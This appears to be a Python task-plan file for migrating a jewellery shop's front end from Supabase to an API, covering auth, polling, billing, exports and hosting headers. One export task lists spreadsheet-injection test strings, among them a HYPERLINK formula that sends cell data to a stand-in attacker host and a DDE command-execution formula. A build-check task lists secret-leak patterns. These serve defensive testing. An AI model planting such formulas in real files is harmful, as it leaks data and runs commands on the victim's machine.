# -*- coding: utf-8 -*-
"""Front end (repository jewelvault-app): replace the Supabase pieces by an API client and put the screens on the API."""
from plan_core import T, ROLLBACK_LOCAL_WEB as RBW

APP = "app"

T("FE01", "WEB", "DONE: integer pricing copy and the shared selectors (kept from the Supabase build)",
  status="DONE", repo=APP, grp="pure", commit="9724728 (jewelvault-app, merged into main); 323 unit tests",
  reqs=["R3", "R4", "R5", "R6", "R7", "R8", "R9", "V5"],
  tests=[],
  do="Already in `jewelvault-app`: `src/lib/pricing.ts` (533 lines, no imports: `priceLine`, `priceBill`, `parseRupees`, `parseGrams`, "
     "`defaultLabourRate`, `defaultMetalRate`, `saleTypeForCustomer`, money in paise and weight in milligrams, `CURRENT_PRICING_VERSION` "
     "1) and `src/lib/selectors.ts` (465 lines: the one set of figures for sales, cancelled bills, outstanding, evening figures "
     "and the customer card over the derived-read shapes). 323 unit tests (`tests/unit/pricing.test.ts`, `selectors.test.ts`), an "
     "independent 800-bill Python oracle agreed, 14 deliberate breakages were all caught. This survives the stack change unchanged and is the "
     "file the API copies byte for byte (API18). Measured: planned 1.0 plan-day, 35 agent minutes.",
  files=["src/lib/pricing.ts", "src/lib/selectors.ts", "tests/unit/pricing.test.ts", "tests/unit/selectors.test.ts"],
  done="Evidence, not re-done: `npm test` in `jewelvault-app` runs the 323 pricing and selector tests green (they sit beside "
       "Supabase-era tests that WEB15 removes). The spec tests T-A01 to T-A19 are proved at API level by API18 and API20.",
  rollback="Already committed.")

T("WEB00", "WEB", "Front-end test harness: unit, build check, Playwright against a lane API, a new verify command",
  agent="B", repo=APP, grp="web", pd=0.8, deps=["API05", "API09"],
  reqs=[], tests=[],
  ptests=["PT-W0 harness smoke: a lane MariaDB and the built API start, the admin door makes an owner, a Playwright page logs in against it"],
  do="In a NEW worktree of `jewelvault-app` (branch `api-web`; the old Supabase worktrees `jewelvault-wt/a,b,c` are not used and "
     "not touched): `scripts/e2e-lane.mjs` starts a lane (it calls the API repo's `npm run db:lane -- up <lane>`, builds and "
     "starts the API on a lane port from `JV_API_DIR` (the orchestrator's checkout of `main` of `jewelvault-api`: the orchestrator merges each finished API task into it before the web task that needs it starts), creates one owner, one biller and one staff user through the admin door "
     "(`npm run admin`), and prints their test e-mails and passwords to the lane's never-committed `.lanes/<lane>/.env.local`), "
     "Playwright config with `workers: 1`, the dev server port from `PORT`, a global setup that uses it; `npm run verify` "
     "replaced: typecheck, changed-file lint, unit tests, build, build check (WEB14), and `test:e2e` when `E2E=1`; "
     "`.gitignore` gets `.lanes/`. The Supabase lane script and migrations are left in place until WEB15 removes them, but "
     "`verify` no longer calls them.",
  files=["playwright.config.ts", "tests/e2e/global-setup.ts", "tests/e2e/README.md", "package.json", "scripts/lane.mjs", ".gitignore"],
  done="`E2E=1 npm run verify` on a lane starts a MariaDB container, the API and the static site, runs one Playwright page that "
       "logs in as the owner created through the admin door, and stops everything; two lanes run at the same time on different "
       "ports; `docker ps` shows only the lane's own container afterwards removed with `docker rm -fv` (no volume left).",
  rollback=RBW)

T("WEB01", "WEB", "API client: credentials, headers, Idempotency-Key, error map, waking-up retry, string money",
  agent="B", repo=APP, grp="web", pd=1.0, deps=["WEB00", "API05", "API06", "API07"],
  reqs=[], tests=[], uses=["C7", "C12", "C13", "S8", "S3"],
  ptests=["PT-W1 api client: money and weight leave as strings; a JSON number is never sent; the same Idempotency-Key is reused on a retry of one user action and a new one is made for the next action; a JV_BUSY is retried once with the same key; a gateway error or a non-JSON reply shows 'Waking up' and retries with back-off for up to 30 s"],
  do="`src/lib/api/client.ts` (new): base URL from `NEXT_PUBLIC_API_URL` only; `fetch` with `credentials: 'include'`; "
     "`X-JV-Client: web` on every state-changing call; `Idempotency-Key` made once per function call and reused on a retry of "
     "that call; money and weight are strings both ways; `ApiError` with code, status, details and request id; the `JV_*` "
     "to plain-message map (C13: a refusal before any write says nothing was changed; `JV_INTERNAL` and a `JV_BUSY` that fails "
     "again say 'Could not confirm that this was saved.' and trigger the re-read of that customer's bills and receipts); one "
     "automatic retry of `JV_BUSY` with the same key; back-off 8, 16, 30 s for polling; a gateway error or non-JSON reply "
     "means 'Waking up' and a retry for up to 30 s (a money call keeps its key); the `pricing_sha256` comparison with the "
     "build's own hash (mismatch disables Save on bills); `401` hook. `src/lib/api/types.ts` mirrors the response shapes "
     "of NODE-DESIGN section 4. No business data is stored in the browser.",
  files=["package.json", "src/lib/authStore.ts"],
  done="`npm test -- tests/unit/api-client.test.ts` passes (PT-W1) with a stubbed `fetch`: each rule above is a case; and one "
       "contract test against the lane API (WEB00) logs in, reads `me`, sends `activity` and maps a `JV_INVALID_INPUT` and a `401` through the client "
       "(the forced retry with one key that makes one customer is the contract test of WEB07, where X6 exists).",
  rollback=RBW)

T("WEB02", "WEB", "Session gate, login screen, roles and idle logout on the API (authStore replaced)",
  agent="B", repo=APP, grp="web", pd=1.3, deps=["WEB01", "API09"],
  reqs=["U5", "U6", "U7", "U8", "C16", "C18"], tests=["T-E01", "T-E08"], extends=["T-D06"],
  do="Rewrite `src/lib/authStore.ts` on the API (module-level state: loading, login, app; `useSession`; the screens-by-role list "
     "of 1.3 stays; `/scan-detail` owner only; a route not in the list is closed): `POST /v1/auth/login`, `GET /v1/auth/me` "
     "after login and at start-up, `logout` (empties every cache and stops every poller, nothing left in memory or browser "
     "storage), `POST /v1/auth/activity` at most once a minute on a click or key press, the screen's own logout after 12 "
     "hours without one, any `401` from any call empties memory, stops the pollers and shows the login screen once "
     "without a loop, a `403 JV_FORBIDDEN` from the poll pauses it and calls `me` once (a lower role empties the owner-only "
     "data, `sku_private` and the audit data included, and opens the gate again), a must-change-password user sees only the "
     "change-password screen, `JV_FORBIDDEN` with reason `inactive` shows 'Your account is not active'. `LoginScreen.tsx` shows "
     "no credentials or hints. The Supabase client file is NOT touched yet (WEB15). Preview mode stays until WEB15 so that "
     "the screens can still be looked at without an API.",
  files=["src/lib/authStore.ts", "src/components/AppLayout.tsx", "src/components/LoginScreen.tsx", "tests/unit/auth-routes.test.ts",
         "tests/unit/preview-mode.test.ts", "tests/e2e/login.spec.ts"],
  done="`E2E=1 npx playwright test tests/e2e/login.spec.ts` passes against a lane: login per role; a wrong password fails; an "
       "inactive login sees 'Your account is not active'; 20 login and logout cycles never hang; "
       "with the browser clock faked the screen logs out after 12 hours without a click or key "
       "press (T-E08); T-D06's E2E half passes (a deactivated user gets 401 at the next call, an open session included); "
       "`tests/unit/auth-routes.test.ts` is updated and green; `grep -rn admin123 src out` finds nothing.",
  rollback=RBW)

T("WEB03", "WEB", "Hydrate behind the loading gate, merge by id (stock side first)",
  agent="B", repo=APP, grp="web", pd=1.2, deps=["WEB02", "API11"],
  reqs=["C2", "C9"], tests=["T-E05"], extends=["T-F03", "T-E01"],
  ptests=["PT-W3 hydrate of 2,500 pieces, 1,500 rows of another resource and the stock side arrives in full with progress shown"],
  do="`src/lib/cache/hydrate.ts` and the gate in `AppLayout.tsx`: after login every resource the role may read is loaded by "
     "`GET /v1/sync/{resource}` in pages of at most 1,000 (the cursor advances by the rows received, so a lower page cap works "
     "too), progress shown ('3 of 8 tables'), an error with a retry button when it fails, never sample data and never an empty "
     "list; the stores keep their exported names and synchronous reads (`getDesigns()`, `getSettings()` ...) answering from memory "
     "after the gate; the 16 files that re-read the stores every second keep doing so only against memory; the cache merges "
     "by id keeping the greater `updated_at` compared as microsecond numbers parsed from the exact text; `mockData.ts` is no longer "
     "a fallback: it is read only inside `PREVIEW_MODE` builds (sample data with no API, so the screens can still be looked at) until WEB15 removes both (D20). The first poll after a hydrate starts from the `server_time` of the hydrate's first page minus "
     "30 s (WEB04).",
  files=["src/components/AppLayout.tsx", "src/lib/designStore.ts", "src/lib/catalogStore.ts", "src/lib/settingsStore.ts", "src/lib/mockData.ts"],
  done="`E2E=1 npx playwright test tests/e2e/hydrate.spec.ts` passes: after a session nothing is in browser storage; a failed "
       "load shows an error with a retry and never sample data; logout empties memory and stops the pollers; 2,500 pieces all load "
       "also with the API page cap lowered to 500; the render-time reads and `useState(getX())` pages show data right after "
       "the gate; the owner sees the rate card right after the gate (T-E01 clause). The 10-second hydrate budget on a 4G profile is measured on staging (OPS04).",
  rollback=RBW)

T("WEB04", "WEB", "Polling, merge, offline banner and 'Waking up'",
  agent="B", repo=APP, grp="web", pd=1.2, deps=["WEB03"],
  reqs=["C7"], tests=["T-E02", "T-E03", "T-E07"], extends=["T-E01"],
  do="`src/lib/cache/poll.ts`: one `POST /v1/sync/poll` every 8 seconds (a setting, 5 to 10) and at once after any write the screen "
     "made, a cursor per resource taken from the data and moved only after every page of that poll has arrived, the 30-second "
     "overlap, merge by id keeping the greater `updated_at`, the caller's `role` read from every answer, a hidden tab polling "
     "every 30 s and at once when shown; a pending row (ordinary edit in flight) ignores polled copies; the offline banner "
     "('Offline: changes cannot be saved') with every Save control disabled and polling back-off 8, 16, 30 s; 'Waking up…' "
     "on a gateway error or non-JSON reply with a retry for up to 30 s; one successful call clears the banner; `data_epoch` "
     "changing makes the screen hydrate again.",
  files=[],
  done="`E2E=1 npx playwright test tests/e2e/poll.spec.ts` (two browsers) passes: a stock change on one shows on the other "
       "within 10 seconds; a piece sold on one shows Sold on the other; a payment moves the other browser's pending and balance "
       "(after WEB07/WEB09 the same spec runs on money); a row committed late by a 20-second transaction run directly on the "
       "database still arrives; a 1,500-row poll arrives in full through paging; two rows with the same `updated_at` at a page "
       "edge are both received; a row stamped at the start of a 40-second import transaction still arrives; a hydrate slowed to "
       "40 s with a transaction that commits 4 s after the first page still ends with that row on screen; with the network "
       "cut the banner appears and Save is disabled and clears after reconnect; a gateway error followed by a normal reply shows "
       "'Waking up…' and then clears; a user deactivated while signed in is logged out at the next poll; a user demoted from owner to biller while signed in "
       "(admin door) loses `sku_private` and the audit data from memory within one poll, the screen calls `me` once and does not loop (T-E01 clause).",
  rollback=RBW)

T("WEB05", "WEB", "Stock-side stores on the API: ordinary edits, settings, categories, rates",
  agent="B", repo=APP, grp="web", pd=1.2, deps=["WEB04", "API13", "API13b"],
  reqs=["C5", "C8", "C11"], tests=[], extends=["T-E05", "T-C01"],
  ptests=["PT-W5 an ordinary edit updates memory at once, awaits one write with only the changed fields and the exact updated_at text, replaces the row on success and rolls back with the reason on failure, a stale edit reloads the row"],
  do="`designStore.ts`, `catalogStore.ts`, `settingsStore.ts` (and `EditStockClient.tsx`, `SettingsClient.tsx`, "
     "`DashboardRateCard.tsx`): remove every `localStorage` use (the old `jaishri.*` keys are never read or written); ordinary "
     "edits of C5(a): memory is updated and the row marked pending, ONE write is awaited with only the changed fields and "
     "`expected_updated_at` as exact text (never turned into a date), a pending row ignores polled copies until the write finishes, "
     "success replaces the row with the returned one, failure rolls memory back and shows the reason, `409 JV_STALE` reloads "
     "the current row; settings are one row per key; the daily-rate entry (owner any date up to today, biller today only) on the "
     "rate card; the cache never makes up an id or a number except a new design's id (C11); `getNextInvoiceNumber`-style 'next "
     "number' displays are gone ('Number assigned when saved').",
  files=["src/lib/designStore.ts", "src/lib/catalogStore.ts", "src/lib/settingsStore.ts", "src/app/edit-stock/components/EditStockClient.tsx",
         "src/app/settings/components/SettingsClient.tsx", "src/app/components/DashboardRateCard.tsx"],
  done="`npm test -- tests/unit/stores.test.ts` and `E2E=1 npx playwright test tests/e2e/stock-edit.spec.ts` pass (PT-W5): a "
       "piece edit shows at once and persists after reload; a stale edit in a second browser shows the reload message; staff cannot "
       "edit settings or see the original weight; a biller can enter today's rate and not yesterday's; `grep -rn localStorage src` "
       "finds only the preview-mode file until WEB15; C8: after a session no business data is in browser storage (T-E05 clause); the cache never makes up an id or a number except a new design's id (C11, T-C01 clause).",
  rollback=RBW)

T("WEB06", "WEB", "Add Design with photos (resize 1000 px / q72), create_design and set_sku_status from the screens",
  agent="B", repo=APP, grp="web", pd=1.1, deps=["WEB05", "API16", "API17"],
  reqs=[], tests=[], uses=["P2", "X8", "X9"],
  ptests=["PT-W6 Add Design with three photos end to end (full + 320 px thumbnail uploaded, then create_design), staff has no original-weight field, a fourth photo is refused with a plain message"],
  do="`AddDesignClient.tsx`: the screen makes the design's UUID and one UUID per photo before uploading, resizes in the browser "
     "to a longest side of 1000 px at JPEG quality 72 and a 320 px thumbnail (`src/lib/photos.ts`), uploads each with `PUT "
     "/v1/designs/{design_id}/photos/{photo_id}?kind=full|thumb`, then calls `create_design` (X8) with a fresh Idempotency-Key; "
     "no image text in a row (P4); photo `<img>` addresses come from `NEXT_PUBLIC_API_URL`; staff see no original-weight field; "
     "the owner may enter it; X9 from the stock screens (status changes, archive); saving states disabled while a call "
     "runs; `JV_*` errors mapped.",
  files=["src/app/add-design/components/AddDesignClient.tsx", "src/app/edit-stock/components/EditStockClient.tsx",
         "src/app/design-detail/components/DesignGallery.tsx"],
  done="`E2E=1 npx playwright test tests/e2e/add-design.spec.ts` passes (PT-W6) with Siddhi's four product photos from "
       "`Client/design/`: three photos attach, a fourth is refused, the photos open in the gallery from the API, a staff login has "
       "no original-weight field and the owner has one, the created pieces carry the numbers the API assigned, a double click "
       "on Save makes one design.",
  rollback=RBW)

T("WEB07", "WEB", "Money-side cache: customers, bills, receipts, allocations and the derived reads; Invoice shape",
  agent="B", repo=APP, grp="web", pd=1.1, deps=["WEB04", "API12", "API19"],
  reqs=["C1"], tests=[], uses=["C3"],
  do="`appStore.ts` keeps its exported names (`getCustomers`, `getInvoices`, `getInvoiceById`, `getLedgerForCustomer` ...) but "
     "reads from the cache: customers, `bills`, `bill_summary`, `bill_items`, `receipts`, `receipt_allocations`, "
     "`customer_balances`; `getInvoices()` returns bills in the prototype's `Invoice` shape (camelCase, with `items`, `payments` "
     "and the derived `amountReceived`, `pendingAmount`, `status`, `fineWeightPending`) so the screens that only read need no "
     "change; the ledger is loaded per customer when a customer card opens and reloaded when that customer's `updated_at` "
     "changes; the prices, totals and ledger are not computed again in the store (the saved figures come back from the "
     "API); `addCustomer` calls X6 with a fresh Idempotency-Key and applies the returned row. The dashboards, reports and the "
     "customer card keep working on the derived-read shapes (their rewiring to the shared selectors is WEB12).",
  files=["src/lib/appStore.ts", "src/app/billing-pos/components/CustomerSearchPanel.tsx",
         "src/app/customer-ledger/components/CustomerLedgerClient.tsx"],
  done="`npm test -- tests/unit/invoice-shape.test.ts` passes: for a fixture bill from the lane API `getInvoices()` returns the "
       "`Invoice` shape with `amountReceived`, `pendingAmount`, `status`, `fineWeightPending` equal to V1's figures; "
       "creating a customer from the billing screen's search panel makes one customer on a double click and, with the response dropped and the same user action retried, still one customer (the key is reused).",
  rollback=RBW)

T("WEB08", "WEB", "Billing screen on quote_bill and create_bill, customer creation, PAN prompt",
  agent="B", repo=APP, grp="web", pd=1.3, deps=["WEB07", "WEB05", "API20", "API18", "API23", "API19"],
  reqs=["C6"], tests=["T-E06"], extends=["T-A03", "T-E03", "T-A14"],
  do="`BillingPOSClient.tsx`, `BillingSummaryPanel.tsx`, `BillingItemsTable.tsx`, `ScanItemPanel.tsx`: the live total comes from "
     "`pricing.ts` (as today); Save calls `POST /v1/bills` with a fresh Idempotency-Key, shows a saving state, applies the rows "
     "the function returns, and shows the message for the error code; a piece never shows Sold and a bill never shows saved "
     "before the API says so; the saved figures replace the preview and a notice shows if they differ; the sale type follows the "
     "customer and the default labour rate follows the sale type (UNIT half of T-A03); the `Credit` payment row is gone (a "
     "bill left unpaid has no receipt); 'Advance adjusted: ₹X' shown from `advance_applied`; the `PAN_MISSING`, `RATE_MISSING`, "
     "`RATE_STALE` warnings; a held piece asks for confirmation (`confirm_held`); `JV_PIECE_UNAVAILABLE` names the pieces; "
     "the Save button is disabled while a save runs and a retry of the same user action reuses the same key; the offline "
     "banner disables Save; pricing hash mismatch disables Save on bills.",
  files=["src/app/billing-pos/components/BillingPOSClient.tsx", "src/app/billing-pos/components/BillingSummaryPanel.tsx",
         "src/app/billing-pos/components/BillingItemsTable.tsx", "src/app/billing-pos/components/ScanItemPanel.tsx"],
  done="`E2E=1 npx playwright test tests/e2e/billing.spec.ts` passes: a double click on Save creates one bill; a dropped "
       "response (route aborted after the server committed) and a retry create one bill; the same bill in two tabs is saved once; "
       "with the network cut the Save is disabled; a gateway error followed by a normal reply shows 'Waking up…' and a money "
       "call retried meanwhile with the same key saves once (T-E03 clause); the worked example (35.42 g, 6,920, labour 353, "
       "piroi 2.15) saves a bill of 257,612 and the screen's preview equals the saved figure; two billers saving the same piece "
       "give one success and one message naming the piece; the screen disables Save on bills when `pricing_sha256` from `me` differs from the build's own hash (T-A14 screen half).",
  rollback=RBW)

T("WEB09", "WEB", "Payment and silver-fine panels (record_payment, settle_fine), advance display",
  agent="B", repo=APP, grp="web", pd=0.9, deps=["WEB08", "API22", "API24"],
  reqs=["C17"], tests=[], extends=["T-E02", "T-E07"],
  ptests=["PT-W9 receive a payment with a named bill, an unnamed payment (oldest first) and an advance; settle fine in silver and in cash; the other browser's pending and balance change"],
  do="`ReceivePaymentPanel.tsx` and the fine settlement panel in `CustomerLedgerClient.tsx` call X2 and X3 (fresh keys, saving "
     "states, returned rows applied, mode `Credit` gone); a named bill is chosen from the customer's pending bills; the "
     "result shows each part (bill, advance remaining); `JV_OVERPAYMENT`, `JV_CASH_LIMIT` (a biller sees 'the owner enters this "
     "payment'; the owner can type a reason of 10 characters) and `JV_FINE_EXCEEDS` (with the maximum) have their messages; "
     "after any write that touches money the screen re-reads that customer's `bill_summary` and `customer_balances` at once.",
  files=["src/app/customer-ledger/components/ReceivePaymentPanel.tsx", "src/app/customer-ledger/components/CustomerLedgerClient.tsx"],
  done="`E2E=1 npx playwright test tests/e2e/payments.spec.ts` passes (PT-W9, two browsers): receive 600 on a bill of 1,000 and "
       "the other browser's pending changes within 10 seconds; an unnamed payment goes oldest first and the remainder is shown as "
       "an advance; the cash limit message for a biller at 2,00,000; silver fine settled in silver and in cash at a rate.",
  rollback=RBW)

T("WEB10", "WEB", "Estimate view and customer ledger on the API (read-only bills, no date editor)",
  agent="B", repo=APP, grp="web", pd=0.8, deps=["WEB09", "API12"],
  reqs=[], tests=[],
  ptests=["PT-W10 the customer card, a saved estimate and the ledger agree on the same data; the estimate date editor and edit mode are gone"],
  do="`EstimateViewClient.tsx` shows a saved bill read-only from the cache (the date editor and edit mode of "
     "`EstimateViewClient.tsx:113-159` are removed: bills are read-only in M1), `CustomerLedgerTable.tsx`, "
     "`CustomerInvoiceList.tsx`, `CustomerDetail.tsx` read the per-customer ledger (Invoice, Cancellation, Payment, Fine, "
     "Refund, Void rows with the running balance and fine balance) and agree with `customer_balances`.",
  files=["src/app/estimate/components/EstimateViewClient.tsx", "src/app/customer-ledger/components/CustomerLedgerTable.tsx",
         "src/app/customer-ledger/components/CustomerInvoiceList.tsx", "src/app/customer-ledger/components/CustomerDetail.tsx"],
  done="`E2E=1 npx playwright test tests/e2e/ledger.spec.ts` passes (PT-W10): after a bill, a part payment and a fine settlement "
       "the ledger rows, the estimate and the customer card show the same pending, advance and fine figures; the last running "
       "balance equals the card's balance.",
  rollback=RBW)

T("WEB11", "WEB", "Cancel, re-issue, void, refund and opening-balance screens; the error map",
  agent="B", repo=APP, grp="web", pd=1.2, deps=["WEB10", "API25", "API26", "API27", "API28"],
  reqs=["C13"], tests=[], extends=["T-E04", "T-E07"],
  uses=["X4", "X5", "X10", "X11", "X12"],
  ptests=["PT-W11 owner actions work end to end and a biller sees none; cancelling an unpaid bill changes the other browser's outstanding within 10 seconds; PT-U11 the error map covers every JV_ code (unit)"],
  do="Owner-only actions on the screens: cancel with a reason (at least 3 characters), re-issue (the corrected bill is "
     "built on the billing screen and sent to X10; the customer cannot change), void a receipt (with 'void the refund first' "
     "explained), refund (X11; the form is the only part cut with it), and add an opening balance (X12); a biller sees none "
     "of these; the complete error map for every code of S8 (a refusal before any write says that nothing was changed; "
     "`JV_INTERNAL` and a failed `JV_BUSY` say 'Could not confirm that this was saved.' and re-read the customer at once; the "
     "detail goes to the console only).",
  files=["src/app/customer-ledger/components/CustomerLedgerClient.tsx", "src/app/billing-pos/components/BillingPOSClient.tsx"],
  done="`E2E=1 npx playwright test tests/e2e/owner-actions.spec.ts` and `npm test -- tests/unit/error-map.test.ts` pass (PT-W11, "
       "PT-U11): each action works end to end for the owner and is absent for a biller; cancelling an unpaid bill changes the other "
       "browser's outstanding within 10 seconds; the unit test asserts a plain message for every `JV_*` code and the generic one for "
       "an unknown code. T-E04's error-map clause is closed here.",
  rollback=RBW)

T("WEB12", "WEB", "Owner dashboard line and the shared selectors on every figure",
  agent="B", repo=APP, grp="web", pd=0.8, deps=["WEB11", "API35", "API32", "FE01"],
  reqs=["C14"], tests=["T-B15"],
  uses=["V5"],
  do="The dashboard, the reports and the customer card compute their figures from `src/lib/selectors.ts` over the derived reads "
     "(a cancelled bill on its own line, an opening-balance bill on no sales line); the owner's dashboard line (books OK at "
     "02:00 or Problem; age of the last dump and photo copy; database size and backup folder size; days since the last "
     "Download everything and since the last pull; yesterday's review counts) with its red and amber rules from "
     "`GET /v1/dashboard/health`. Download everything and the hidden screens are WEB12b.",
  files=["src/app/components/DashboardKpiGrid.tsx", "src/app/components/DashboardActivityPanels.tsx",
         "src/app/reports/components/ReportsClient.tsx", "src/app/reports/components/ReportSales.tsx",
         "src/app/reports/components/ReportPayments.tsx"],
  done="`npm test -- tests/unit/selectors.test.ts` still green and `E2E=1 npx playwright test tests/e2e/dashboard.spec.ts` "
       "passes: the dashboard, reports, customer card and the three evening figures agree on the same data; a cancelled bill "
       "is on its own line and a cancelled opening bill on none; the dashboard line shows each reason and turns red/amber as API35/MB05 compute.",
  rollback=RBW)

T("WEB12b", "WEB", "Download everything, the hidden screens and the Reports cut line",
  agent="B", repo=APP, grp="web", pd=0.7, deps=["WEB12", "API35"],
  reqs=["C15"], tests=["T-E04"], extends=["T-R05", "T-D03"],
  uses=["B3", "O32"],
  note="The zip must carry customers.csv, bills.csv, receipts.csv, receipt_allocations.csv (or allocations.csv) and MANIFEST.csv (columns file, rows), with CSV headers equal to the database column names (the list is under API36 in the API repository's docs/handoffs.md), or the pulled-forward `scripts/zip-balances.mjs` (T-R05 drill) refuses with the name of the missing column.",
  do="'Download everything' builds in the browser from the cache, after a fresh poll, one zip of "
     "CSV files (customers, bills, bill items, receipts, allocations, stock, daily rates, categories, settings, users' "
     "names and roles, never a hash; the owner-only weight only for the owner; a cell starting with `=`, `+`, `-`, `@`, a tab "
     "or a carriage return gets a single quote in front; **one guard function, also used by `csvCell` of `downloadCsv` and by the HTML cell writer of `downloadExcel` in `src/lib/exportUtils.ts` (the inventory screen, open to all three roles), with a test on `=HYPERLINK(\"http://evil.example/?\"&A1,\"click\")`, `+1+1`, `-2+3`, `@SUM(A1)`, `=cmd|' /C calc'!A0`, a tab and a carriage return: RV1-9**) plus `MANIFEST.csv`, then posts the record (API35); Order Book, the "
     "public catalogue and its admin screens, the sample Audit and Sales tabs, the Estimate date editor and the Reports "
     "date controls and export buttons are not connected and not reachable; 'Reset Defaults' and 'Delete All Inventory' are "
     "gone. The Reports screen is rewired to the selectors (WEB12), or hidden if the cut line is used (O32).",
  files=["src/components/Sidebar.tsx", "src/lib/exportUtils.ts"],
  done="`E2E=1 npx playwright test tests/e2e/hidden-and-download.spec.ts` passes (T-E04): the hidden screens cannot be reached by URL; the zip holds the "
       "files and a MANIFEST whose counts equal the database's; a cell starting with `=` is quoted; the record route accepts it "
       "and the card resets; the owner-only weight is in it only for the owner (T-D03 clause: no CSV for a biller holds it); "
       "`getInvoices()` returns the `Invoice` shape and every S8 code has a plain message (the clause is closed in WEB11, re-run here).",
  rollback=RBW)

T("WEB13", "WEB", "Printed estimate and tag page (PLAN.md P3-T1)",
  agent="B", repo=APP, grp="web", pd=1.0, deps=["WEB10", "API18"],
  reqs=[], tests=[],
  ptests=["PT-W13 an automatic print check prints 1, 6 and 40 items and finds 'Grand Total' on the last page every time; the tag printout has no app bars"],
  note="Not in the spec (section 1.1 puts the printed layout out of scope) but on the go-live path: PLAN.md P3-T1, kept here so that the critical path is honest. If Siddhi's CA wants other particulars on the printed estimate (O15, O16, O20) they are a later change.",
  do="Flowing pages with no fixed height, the totals block kept together, the header row repeated, shop name, address and phone "
     "from Settings (layout only; the figures come from the API), and a print shell that hides the app bars for tags "
     "(`PrintTagsClient.tsx`).",
  files=["src/app/estimate/components/EstimateViewClient.tsx", "src/app/print-tags/components/PrintTagsClient.tsx",
         "src/app/components/DashboardRateCard.tsx"],
  done="`E2E=1 npx playwright test tests/e2e/print.spec.ts` passes (PT-W13): printing 1, 6 and 40 items finds 'Grand Total' on the "
       "last page every time; the tag printout has no app bars.",
  rollback=RBW)

T("WEB14", "WEB", "Hosting headers (vercel.json), build checks, no source maps, API address only",
  agent="C", repo=APP, grp="pure", pd=0.8, deps=["WEB02", "API10"],
  reqs=["H1", "H2", "H3", "H4", "C10", "U10"], tests=["T-D12"],
  note="PULLED FORWARD on Harsh's instruction (17 Oct) and done in a separate session (commit aca0f4a on the branch api-web of jewelvault-app, which stays there: it is NOT merged into that repository's main, by Harsh's branch rule; WEB00 continues on api-web). Its listed dependencies are not hard: vercel.json and the build check need nothing from WEB02, and API10 is done. The checks that need WEB02, WEB01 or WEB15 are tests marked pending (6 todo): the strict single-variable rule (WEB15), the real build of the API-backed front end, the policy against real calls in a browser (WEB00), `curl -I` on a host (OPS04, OPS07). vercel.json names the production API origin only: see decision 11.",
  do="`vercel.json` with `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: "
     "strict-origin-when-cross-origin`, `X-Frame-Options: DENY`, a restrictive `Permissions-Policy` and a `Content-Security-Policy` "
     "(report-only first) that allows only the site itself, the API's origin in `connect-src` AND `img-src`, and the inline "
     "scripts the static export needs (no other outside origin; no Supabase origin); `scripts/check-build.mjs` fails the build "
     "if `out/` contains `mysql://`, `mariadb://`, `DB_PASSWORD`, `DATABASE_URL`, `admin123`, `staff123` or any `.map` file, or "
     "if `src/` uses `dangerouslySetInnerHTML` or `innerHTML`; the only build-time variable is `NEXT_PUBLIC_API_URL`; the "
     "build produces every route as a static page and no page touches `window` during prerender; no source maps.",
  files=["next.config.mjs", "package.json"],
  done="`npm run build && npm run check:build` passes (every route exists as a static page; no `.map` file) and fails on a planted `admin123` in `out/`, a planted `.map` file and a "
       "planted `innerHTML` (each shown); the headers are asserted on the text of `vercel.json` and on the API's responses in API07's test (the `curl -I` on a real host is the T-D12 clause of OPS04); "
       "the CSP names the API origin in `connect-src` and `img-src` and no other outside origin. The repeat on the "
       "real website host and Siddhi's domain is OPS07.",
  rollback=RBW)

T("WEB15", "WEB", "Remove the Supabase pieces and preview mode; leave one clean app",
  agent="B", repo=APP, grp="web", pd=0.6, deps=["WEB12b", "WEB13", "WEB14", "WEB16", "WEB17"],
  reqs=[], tests=[],
  note="Empty `TOLERATED` in scripts/check-build.mjs (the Supabase and preview variable names the build check still tolerates, from WEB14) so that only NEXT_PUBLIC_API_URL is left (H4).",
  ptests=["PT-W15 a production build with NEXT_PUBLIC_PREVIEW_MODE=1 opens the login screen exactly like a build without it; no file mentions supabase"],
  do="Delete `src/lib/supabase/client.ts`, the `@supabase/supabase-js` and `supabase` and `pg` dependencies, `supabase/` "
     "(the old migrations and seeds that are frozen, including `0016_write_prologue_customer.sql` of DB09a, commit 6b68285), `scripts/lane.mjs`, `scripts/check-migrations.sh` and their tests "
     "(`tests/db/*`, `tests/unit/lane.test.ts`, `tests/unit/migrations-check.test.ts`); remove the `PREVIEW_MODE` constant, its "
     "branches in `authStore.ts` and `AppLayout.tsx` (added by commit 45a444e) and `tests/unit/preview-mode.test.ts` (a build can no longer open "
     "without a login whatever the environment holds); update `AGENTS.md`/`README.md`. This is the code half of the go-live "
     "step; Harsh removes `NEXT_PUBLIC_PREVIEW_MODE` from the Vercel project himself (PH08).",
  files=["src/lib/supabase/client.ts", "src/lib/authStore.ts", "src/components/AppLayout.tsx", "tests/unit/preview-mode.test.ts",
         "package.json", "README.md", "AGENTS.md"],
  done="`grep -rIl -i supabase . --exclude-dir=node_modules --exclude-dir=.git --exclude-dir=out` finds nothing; `NEXT_PUBLIC_"
       "PREVIEW_MODE=1 npm run build` still shows the login screen first (PT-W15); `npm run verify` is green; the bundle "
       "contains no `supabase` string.",
  rollback=RBW)

T("WEB16", "WEB", "The stale-rate guard on the screen (PLAN.md P3-T2, the part that stays)",
  agent="B", repo=APP, grp="web", pd=0.4, deps=["WEB08", "API18", "WEB05"],
  reqs=[], tests=[],
  ptests=["PT-W16 a rate not confirmed today asks for confirmation before the first bill of the day; a stale or missing rate shows its warning and the line stays editable"],
  note="Not in the spec (it is PLAN.md P3-T2) but on the go-live path. PLAN.md 7.1 step 1 cuts only the purity split and says the stale-rate guard stays; the data side (rates by material and purity, RATE_MISSING, RATE_STALE) is D4/R2 in API13/API18.",
  do="The daily rate card shows the rate rows with their real dates (today the prototype shows defaults, 6,920 and 88, and a 'Last updated' that always says today); a rate "
     "not confirmed today asks for confirmation before the first bill of the day; `RATE_MISSING` and `RATE_STALE` from the API show on the bill and the line can still be edited.",
  files=["src/app/components/DashboardRateCard.tsx", "src/app/billing-pos/components/BillingPOSClient.tsx"],
  done="`E2E=1 npx playwright test tests/e2e/rates.spec.ts` passes (PT-W16): with no rate for today the first bill asks for confirmation; a rate dated before the bill shows `RATE_STALE` and still saves.",
  rollback=RBW)

T("WEB17", "WEB", "Rate card by purity (PLAN.md P3-T2, the part that is cut first)",
  agent="B", repo=APP, grp="web", pd=0.4, deps=["WEB16"],
  reqs=[], tests=[],
  ptests=["PT-W17 a new bill takes the rate for its piece's purity (24K, 22K, 20K, 18K) and the line can still be edited"],
  note="Cut 4 of the cut line: billing stays correct without it because the rate is typed or edited on every line.",
